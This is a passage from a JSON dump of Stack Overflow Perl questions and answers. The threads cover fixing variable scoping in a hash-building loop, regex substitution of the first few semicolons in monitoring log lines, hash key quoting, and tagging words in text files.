If you show your actual data (a few lines), I can also add some code to back up that comment."}, {"owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466628989, "post_id": 37977057, "comment_id": 63402204, "body": "@zdim Yes, you are right - using a regex would make parsing more clear - thank you for the suggestion."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466629054, "post_id": 37977057, "comment_id": 63402239, "body": "@EA00  I now see your comment just above -- (1) you need the number after <code>t.</code>, so <code>10</code> (2) what do you need from the other line, in the example in your comment above?"}, {"owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466629126, "post_id": 37977057, "comment_id": 63402270, "body": "@zdim From the second line I just need the name of the output file &quot;output###.txt&quot;"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466631170, "post_id": 37977057, "comment_id": 63403192, "body": "@EA00  I added some examples of how to do it with regex. Note that there are, of course, yet other ways to do that -- and/or to organize the parsing of a pair of lines."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466632039, "post_id": 37977057, "comment_id": 63403569, "body": "@EA00  Btw, I generally reach for <code>split</code> first, unless a regex is specifically called for. It&#39;s just that in this case you need the <i>delimiter</i> itself in the first line, and very precise counting in the second, which is why I brought up regex.  While, in fact, I often find myself suggesting a simple <code>split</code> instead of some crazy complex regex :)"}, {"owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466642179, "post_id": 37977057, "comment_id": 63406432, "body": "@zdim Thank you so much for taking the time to not only help me with my problem, but to also teach me about perl. The regex definitely simplified the script, and made it more efficient - I just tend to shy away from using them, as they are sometimes intimidating to implement, at least for a beginner like myself."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1466658201, "post_id": 37977057, "comment_id": 63410457, "body": "@EA00 You are most welcome. You are working on what you bring up, absorbing new things, and it&#39;s a pleasure to help out a little. Regex are a bit specific, I agree. (And they can get very involved, too, turning into a separate little language.) I would suggest though to get the basics down as that is something that you do use daily, when comfortable with it.  It&#39;s one of the things that should be in your toolbox."}], "answers": [{"comments": [{"owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466627769, "post_id": 37977597, "comment_id": 63401623, "body": "@PerlDog the splitting works for me in extracting the number and output for each respective line - I just can&#39;t get the hash to initialize. However, your suggestion for dropping the my works! Thanks!"}, {"owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "edited": false, "score": 0, "creation_date": 1466627801, "post_id": 37977597, "comment_id": 63401637, "body": "@zdim I was trying to figure out how to print the hash - so thank you. Also, your explanation makes a lot of sense."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466627812, "post_id": 37977597, "comment_id": 63401640, "body": "@PerlDog  Fair point, thank you, I&#39;ve changed the offending statement to say that the hash is fine, not all else.  (However, note what I added -- split actually does pick up the number.) I&#39;ll fix the parsing as well.  Thank you."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466628122, "post_id": 37977597, "comment_id": 63401770, "body": "@PerlDog  On the contrary.  The <code>split</code> may well be suitable for the actual data, but it is not best for what is shown, in my opinion -- it relies on <code>split</code> keeping the captured pattern and then plucks that by index, thus reversing the main purpose of <code>split</code>. If we want numbers I wouldn&#39;t <code>split</code> on numbers and count indices -- I think a regex would be far clearer."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "edited": false, "score": 1, "creation_date": 1466628408, "post_id": 37977597, "comment_id": 63401919, "body": "@EA00 For printing hashes (or any other data structures) you may have a look at <a href=\"http://perldoc.perl.org/Data/Dumper.html\" rel=\"nofollow noreferrer\">Data::Dumper</a>. It&#39;s a core module written for that very purpose."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466631651, "post_id": 37977597, "comment_id": 63403402, "body": "@PerlDog  I&#39;ve cleaned up some as well, remove more if you wish and I&#39;ll follow.  (Will monitor this.) Thank you again for the constructive comment, I had added that and then also expanded the answer along those lines."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 7, "last_activity_date": 1469872096, "last_edit_date": 1469872096, "creation_date": 1466626992, "answer_id": 37977597, "question_id": 37977057, "link": "https://stackoverflow.com/questions/37977057/perl-initialization-of-hash/37977597#37977597", "title": "Perl - initialization of hash", "body": "<p>It's a good idea, but your <code>$key</code> that is created with <a href=\"http://perldoc.perl.org/functions/my.html\" rel=\"nofollow\"><code>my</code></a> in the <code>if</code> <em>block</em> is a local variable scoped to that block, masking the global <code>$key</code>.  Inside the <code>if</code> block the symbol <code>$key</code> has nothing to do with the one you nicely declared upfront. See <a href=\"http://perldoc.perl.org/perlsub.html#Private-Variables-via-my%28%29\" rel=\"nofollow\"><code>my in perlsub</code></a>.</p>\n\n<p>This local <code>$key</code> goes out of scope as soon as <code>if</code> is done and does not exist outside the <code>if</code> block. The global <code>$key</code> is again available after the <code>if</code>, being visible elsewhere in the loop, but is undefined since it has never been assigned to. The same goes for <code>$value</code> in the <code>elsif</code> <em>block</em>.</p>\n\n<p>Just drop the <code>my</code> declaration inside the loop, thus assign to those global variables (as intended?). So, <code>$key = ...</code> and <code>$value = ...</code>, and the hash will be assigned correctly.</p>\n\n<hr>\n\n<p>Note -- this is about how to get that hash assignment right. I don't know how your actual data looks and whether the line is parsed correctly.  Here is a toy <code>input.txt</code></p>\n\n<pre>\n@cluster t.1 \n1111 ../../../output1.1.txt/\n@cluster t.2 \n2222 ../../../output2.2.txt/\n</pre>\n\n<p>I pick the 4th field instead of the 6th, <code>$value = $output[3];</code>, and add</p>\n\n<pre><code>print \"$_ =&gt; $hash{$_}\\n\" for keys %hash;\n</code></pre>\n\n<p>after the loop. This prints</p>\n\n<pre>\n1 => output1.1.txt\n2 => output2.2.txt\n</pre>\n\n<p>I am not sure whether this is what you want but the hash is built fine.</p>\n\n<hr>\n\n<p><em>A comment on choice of tools in parsing</em></p>\n\n<p>You parse the lines for numbers, by using the property of <a href=\"http://perldoc.perl.org/functions/split.html\" rel=\"nofollow\"><code>split</code></a> to return the separators as well, when they are captured. That is neat, but in some sense it reverses its main purpose, which is to extract <em>other</em> components from the string, as delimited by the pattern. Thus it may make the purpose of the code a little bit convoluted, and you also have to index very precisely to retrieve what you need. </p>\n\n<p>Instead of using <code>split</code> to extract the delimiter itself, which is given by a regex, why not extract it by a regex? That makes the intention crystal clear, too. For example, with input</p>\n\n<pre>\n@cluster t.10 has 4319 elements, 0 subclusters \n37652 ../../../../clust/output43888.txt 1.397428\n</pre>\n\n<p>the parsing can go as</p>\n\n<pre><code>if ($line =~ m/^\\@cluster/) {\n    ($key) = $line =~ /t\\.(\\d+)/;\n}   \nelsif ($line =~ m/^(\\d+)/) { \n    ($value) = $line =~ m|.*/(\\w+\\.txt)|;\n}    \n$hash{$key} = $value if defined $key and defined $value;\n</code></pre>\n\n<p>where <code>t\\.</code> and <code>\\.txt</code> are added to more precisely specify the targets. If the target strings aren't certain to have that precise form, just capture <code>\\d+</code>, and in the second case all non-space after the last <code>/</code>, say by <code>m|^\\d+.*/(\\S+)|</code>. We use the greediness of <code>.*</code>, which matches <em>everything</em> possible up to the thing that comes after it (a <code>/</code>), thus all the way to the very last <code>/</code>.</p>\n\n<p>Then you can also reduce it to a single regex for each line, for example</p>\n\n<pre><code>if ($line =~ m/^\\@cluster\\s+t\\.(\\d+)/) {\n    $key = $1;\n}\nelsif ($line =~ m|^\\d+.*/(\\w+\\.txt)|) {\n    $value = $1;\n}\n</code></pre>\n\n<p>Note that I've added a condition to the hash assignment. The original code in fact assigns an <code>undef</code> on the first iteration, since no <code>$value</code> had yet been seen at that point. This is overwritten on the next iteration and we don't see it if we only print the hash afterwards.  The condition also guards you against failed matches, for malformatted lines or such.  Of course, far better checks can be run.</p>\n"}], "owner": {"reputation": 577, "user_id": 4573353, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/843bcb9df7ef490fdba185dcb76ebea7?s=128&d=identicon&r=PG&f=1", "display_name": "EA00", "link": "https://stackoverflow.com/users/4573353/ea00"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 289, "favorite_count": 0, "accepted_answer_id": 37977597, "answer_count": 1, "score": 2, "last_activity_date": 1469872096, "creation_date": 1466625059, "last_edit_date": 1466627312, "question_id": 37977057, "link": "https://stackoverflow.com/questions/37977057/perl-initialization-of-hash", "title": "Perl - initialization of hash", "body": "<p>I'm not sure how to correctly initialize my hash - I'm trying to create a key/value pair for values in coupled lines in my input file.</p>\n\n<p>For example, my input looks like this:</p>\n\n<pre><code>@cluster t.18\n46421 ../../../output###.txt/\n@cluster t.34\n41554 ../../../output###.txt/\n</code></pre>\n\n<p>I'm extracting the t number from line 1 (@cluster line) and matching it to output###.txt in the second line (line starting with 46421). However, I can't seem to get these values into my hash with the script that I have written. </p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nmy $key;\nmy $value;\nmy %hash;\n\nmy $filename = 'input.txt';\nopen my $fh, '&lt;', $filename or die \"Can't open $filename: $!\";\n\nwhile (my $line = &lt;$fh&gt;) {\n        chomp $line;\n        if ($line =~ m/^\\@cluster/) {\n            my @fields = split /(\\d+)/, $line;\n            my $key = $fields[1];          \n        }\n        elsif ($line =~ m/^(\\d+)/) { \n            my @output = split /\\//, $line;\n            my $value = $output[5];       \n}          \n        $hash{$key} = $value;\n}\n</code></pre>\n"}, {"tags": ["regex", "perl", "replace"], "answers": [{"tags": [], "owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "is_accepted": false, "score": 0, "last_activity_date": 1466622749, "creation_date": 1466622749, "answer_id": 37976451, "question_id": 37976296, "link": "https://stackoverflow.com/questions/37976296/replace-first-x-occurrences-on-each-line/37976451#37976451", "title": "Replace first x occurrences on each line", "body": "<p>Try this for each line:</p>\n\n<pre><code>$nsca_mystr =~ s/^(.+?);(.+?);(.+?);/$1\\t$2\\t$3\\t/;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5923, "user_id": 2105156, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/oRMc0.jpg?s=128&g=1", "display_name": "fugu", "link": "https://stackoverflow.com/users/2105156/fugu"}, "is_accepted": false, "score": 1, "last_activity_date": 1466622824, "creation_date": 1466622824, "answer_id": 37976472, "question_id": 37976296, "link": "https://stackoverflow.com/questions/37976296/replace-first-x-occurrences-on-each-line/37976472#37976472", "title": "Replace first x occurrences on each line", "body": "<pre><code>while (&lt;DATA&gt;) {\n    my ($line) = $_ =~ /;(.*)/; # capture everything after first `;`\n    $line =~ s/;/\\t/ for 1 .. 3; # substitute `;` for \\t for first 3 occurrences\n    print \"$line\\n\"; \n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6812, "user_id": 1410303, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/UVBNS.png?s=128&g=1", "display_name": "SomeDude", "link": "https://stackoverflow.com/users/1410303/somedude"}, "is_accepted": false, "score": 0, "last_activity_date": 1466623461, "creation_date": 1466623461, "answer_id": 37976631, "question_id": 37976296, "link": "https://stackoverflow.com/questions/37976296/replace-first-x-occurrences-on-each-line/37976631#37976631", "title": "Replace first x occurrences on each line", "body": "<p>Ths is what I can think of : </p>\n\n<p>First remove <code>\"[1466621350] PROCESS_SERVICE.....\"</code> part</p>\n\n<p>Then remove the first 3 <code>\";\"</code></p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nmy $line = \"[1466621350] PROCESS_SERVICE_CHECK_RESULT;rs301;Disk IOPS;0;No disks exceeds defined IOPS thresholds | sda=1.40;100;200 sdb=0.00;200;400 sdc=0.00;100;200 sdd=0.00;800;900 sde=0.00;800;900 sdf=0.40;200;3003\";\n\n\n$line =~ s/[[\\d]+]\\s+PROCESS_SERVICE_CHECK_RESULT;//g;\n\nprint \"After regex : \";\n$line =~ s/(\\w+);(\\w+\\s\\w+);(\\d+);(.*)/$1\\t$2\\t$3\\t$4/g;\nprint $line;\nprint \"\\n\";\n</code></pre>\n\n<p>Output :</p>\n\n<pre><code>After regex : rs301     Disk IOPS       0       No disks exceeds defined IOPS thresholds | sda=1.40;100;200 sdb=0.00;200;400 sdc=0.00;100;200 sdd=0.00;800;900 sde=0.00;800;900 sdf=0.40;200;3003\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": true, "score": 1, "last_activity_date": 1466623713, "creation_date": 1466623713, "answer_id": 37976705, "question_id": 37976296, "link": "https://stackoverflow.com/questions/37976296/replace-first-x-occurrences-on-each-line/37976705#37976705", "title": "Replace first x occurrences on each line", "body": "<pre><code>perl -p -e 's/^.+?;(.+?);(.+?);(.+?);/$1\\t$2\\t$3\\t/;' &lt; infile &gt; outfile\n</code></pre>\n\n<p>This \"splits\" the input lines into four \"fields\" at the first four <code>;</code> and replaces them with the 2nd, 3rd, and 4th field separated by <code>\\t</code>. The 1st field is dropped and the remaining text (after the 4th <code>;</code>) remains unchanged. </p>\n\n<p>It could also be written as </p>\n\n<pre><code>perl -p -e 's/^(.+?);(.+?);(.+?);(.+?);/$2\\t$3\\t$4\\t/;' &lt; infile &gt; outfile\n</code></pre>\n\n<p>to make the intention clearer, but this will be (in theory) slightly slower because it captures 4 groups instead of 3 and throws the 1st one away.</p>\n"}], "owner": {"reputation": 5, "user_id": 5223457, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2282b13bf078460c08fb7b8da9d5d8f2?s=128&d=identicon&r=PG&f=1", "display_name": "bipsen", "link": "https://stackoverflow.com/users/5223457/bipsen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 105, "favorite_count": 0, "accepted_answer_id": 37976705, "answer_count": 4, "score": 0, "last_activity_date": 1466623713, "creation_date": 1466622150, "question_id": 37976296, "link": "https://stackoverflow.com/questions/37976296/replace-first-x-occurrences-on-each-line", "title": "Replace first x occurrences on each line", "body": "<p>Using perl on linux, I am trying to parse input from a FIFO and truncate parts of each line, and replace some of the remaining characters - in order to format it for a command line utility, that will be called when all the pending lines in the FIFO has been modified.</p>\n\n<p>My input can look like this:</p>\n\n<pre><code>[1466621350] PROCESS_SERVICE_CHECK_RESULT;rs301;Disk IOPS;0;No disks exceeds defined IOPS thresholds | sda=1.40;100;200 sdb=0.00;200;400 sdc=0.00;100;200 sdd=0.00;800;900 sde=0.00;800;900 sdf=0.40;200;3003\n[1466621350] PROCESS_SERVICE_CHECK_RESULT;rs301a;Connectivity - Admin sessions;0;Connection OK |\n[1466621350] PROCESS_SERVICE_CHECK_RESULT;rs301a;Uptime;0;Uptime ok - 253 days 07:53:49 |\n[1466621350] PROCESS_SERVICE_CHECK_RESULT;rs301a;Volumes in pool;0;Number of volumes: 500 is OK | numvols=500\n</code></pre>\n\n<p>The first part of the string - up to the first semicolon should be deleted - this will give me:</p>\n\n<pre><code>rs301;Disk IOPS;0;No disks exceeds defined IOPS thresholds | sda=1.40;100;200 sdb=0.00;200;400 sdc=0.00;100;200 sdd=0.00;800;900 sde=0.00;800;900 sdf=0.40;200;3003\nrs301a;Connectivity - Admin sessions;0;Connection OK |\nrs301a;Uptime;0;Uptime ok - 253 days 07:53:49 |\nrs301a;Volumes in pool;0;Number of volumes: 500 is OK | numvols=500\n</code></pre>\n\n<p>From this, I need to replace the first 3 semicolons with TAB characters instead.</p>\n\n<p>I am no expert in Perl Regular Expressions - so I have no idea how to achieve the desired output.</p>\n\n<p>Is anyone able to help me out? What should my script variable replacement line look like ?</p>\n\n<p>I know for sure, that this doesn't work, as it replaces all semicolons:</p>\n\n<pre><code>$nsca_mystr=~s/\\;/\\t/g;\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 1133, "user_id": 2185890, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/330b262ed789de0997e720dce8ee1af0?s=128&d=identicon&r=PG", "display_name": "LaintalAy", "link": "https://stackoverflow.com/users/2185890/laintalay"}, "edited": false, "score": 1, "creation_date": 1466619540, "post_id": 37975509, "comment_id": 63397324, "body": "An equivalent access would be <code>$data-&gt;{nav}{current}{performance_gross}</code>"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1466647270, "creation_date": 1466647270, "answer_id": 37981099, "question_id": 37975509, "link": "https://stackoverflow.com/questions/37975509/cannot-understand-some-variables/37981099#37981099", "title": "Cannot understand some variables", "body": "<p><code>nav</code>, <code>'current'</code> and <code>performance_gross</code> are expressions that respectively evaluate to the strings <code>nav</code>, <code>current</code> and <code>performance_gross</code>. These three strings are used as keys to different hashes.</p>\n\n<p>The following are all equivalent:</p>\n\n<pre><code>$data-&gt;{'nav'}-&gt;{'current'}-&gt;{'performance_gross'}\n$data-&gt;{'nav'}{'current'}{'performance_gross'}\n$data-&gt;{nav}-&gt;{current}-&gt;{performance_gross}\n$data-&gt;{nav}{current}{performance_gross}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": false, "score": 1, "last_activity_date": 1466659662, "creation_date": 1466659662, "answer_id": 37983006, "question_id": 37975509, "link": "https://stackoverflow.com/questions/37975509/cannot-understand-some-variables/37983006#37983006", "title": "Cannot understand some variables", "body": "<p>Perl allows arbitrary expressions for the key in a hash lookup:</p>\n\n<pre><code>$hash{ arbitrary($code) . $here }\n</code></pre>\n\n<p>(The resulting string is used as the hash key.)</p>\n\n<p>However, if the only thing between <code>{</code> and <code>}</code> is a simple identifier, it is quoted automatically:</p>\n\n<pre><code>$hash{ some_word }\n# is equivalent to\n$hash{ 'some_word' }\n</code></pre>\n\n<p>That's why you can often omit quotes in hash keys. But it's still valid to explicitly put a string literal there, and it means the same thing.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user6500708"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1466659662, "creation_date": 1466619415, "last_edit_date": 1466619483, "question_id": 37975509, "link": "https://stackoverflow.com/questions/37975509/cannot-understand-some-variables", "title": "Cannot understand some variables", "body": "<p>I have a code line:</p>\n\n<pre><code>$data-&gt;{nav}-&gt;{'current'}-&gt;{performance_gross}\n</code></pre>\n\n<p>I understand <code>$data</code> is scalar and <code>nav</code>, <code>performance_gross</code> are hash keys. But what is <code>'current'</code>?</p>\n"}, {"tags": ["perl", "pattern-matching"], "answers": [{"tags": [], "owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "is_accepted": true, "score": 1, "last_activity_date": 1466616917, "creation_date": 1466616917, "answer_id": 37974787, "question_id": 37974486, "link": "https://stackoverflow.com/questions/37974486/separating-an-output-with-a-tab-space-perl/37974787#37974787", "title": "Separating an Output with a Tab / Space : Perl", "body": "<p>You are outputting an unnecessary newline, and you are constructing your new output line incorrectly.  There is no need to search your hashes for the \"type\" column.  This produces the desired output.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy @file = ('Input 1.txt');\n\nopen my $word_fh,  '&lt;', 'Input 2.txt' or die $!;\nopen my $word2_fh, '&lt;', 'Input 3.txt' or die $!;\n\nmy %words_to_match  = map { chomp $_; $_ =&gt; 0 } &lt;$word_fh&gt;;\nmy %words_to_match2 = map { chomp $_; $_ =&gt; 0 } &lt;$word2_fh&gt;;\n\nclose $word_fh;\nclose $word2_fh;\n\ncheck($_) for @file;\n\nsub check {\n    my $file = shift;\n    open my $fh, '&lt;', $file or die $!;\n    while (&lt;$fh&gt;) {\n        chomp;\n        my ($word, $type) = split;\n        my $line = $_;\n        $line .= '  N' if exists $words_to_match{$word};\n        $line .= '  P' if exists $words_to_match2{$word};\n        print \"$line\\n\";\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 74, "user_id": 201853, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01b1806e805fcb2e09b212880f85e871?s=128&d=identicon&r=PG", "display_name": "Justin", "link": "https://stackoverflow.com/users/201853/justin"}, "is_accepted": false, "score": 1, "last_activity_date": 1466617694, "creation_date": 1466617694, "answer_id": 37975008, "question_id": 37974486, "link": "https://stackoverflow.com/questions/37974486/separating-an-output-with-a-tab-space-perl/37975008#37975008", "title": "Separating an Output with a Tab / Space : Perl", "body": "<p>The problem is this:</p>\n\n<pre><code>my @words_in_line = split;\n\nfor my $word (@words_in_line){\n    ...\n}\n</code></pre>\n\n<p>What you want to do is look at the <em>first word</em> in the line, see if it matches any of your <code>%words_to_match</code> variables, and if it does then append the <code>N</code> or <code>P</code> to <em>the entire line</em>.</p>\n\n<p>Right now you're looking at <em>each word</em> in the line, instead of just the first one. Then you're appending the <code>N</code> and <code>P</code> to the word itself, instead of to the whole line.</p>\n\n<p>Here's what the correct pseudocode would look like:</p>\n\n<pre><code># get the first word in the line\n# if it matches `%words_to_match` then append the `  N` to the entire line\n# if it matches `%words_to_match2` then append the `  P` to the entire line\n# print the line\n</code></pre>\n\n<p>I got this pseudocode from taking the first paragraph in my answer, and breaking it down into pieces.</p>\n\n<p>Anyways, in Perl it looks like this:</p>\n\n<pre><code>my ($first_word) = split;\n\n$_ .= '  N' if exists $words_to_match{$first_word};\n$_ .= '  P' if exists $words_to_match2{$first_word};\n\nprint \"$_\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1467554530, "last_edit_date": 1467554530, "creation_date": 1466623128, "answer_id": 37976542, "question_id": 37974486, "link": "https://stackoverflow.com/questions/37974486/separating-an-output-with-a-tab-space-perl/37976542#37976542", "title": "Separating an Output with a Tab / Space : Perl", "body": "\n\n<p>It makes things a lot easier if you read all your reference files and build data structures from them first, and then read your primary input file and transform it</p>\n\n<p>You're using two hashes, <code>%words_to_match</code> and <code>%words_to_match2</code> and storing every element with a value of zero. That's a waste of information, and the best thing here is to build a <em>single</em> hash that relates the words in each reference file to their part of speech. The words in <code>Input 2.txt</code> are nouns, so they get an <code>N</code>, while those in <code>Input 3.txt</code> are prepositions, so they get a <code>P</code></p>\n\n<p>Then you just have to check to see whether there exists a hash element that matches each word in <code>Input 1.txt</code> and append its value before printing the record if so</p>\n\n<p>The program below creates a hash <code>%pos</code> looking like this, which relates every word in the two reference files to its part of speech</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>( from =&gt; \"P\", John =&gt; \"N\", Mary =&gt; \"N\", to =&gt; \"P\" )\n</code></pre>\n\n<p>and in the final input loop I've used a subtitution <code>s///</code> to replace all trailing whitespace (which includes newlines) with three spaces and the part of speech. Tabs aren't useful things for laying out tables, firstly because no one can agree where the tab stops should be, and secondly because a single tab won't always line up columns. Depending how many characters there were in the preceding data, you may sometimes need two or more</p>\n\n<p>I hope it's clear</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\nuse autodie;\n\nmy %words;\n\nmy %files = (\n    'input 2.txt' 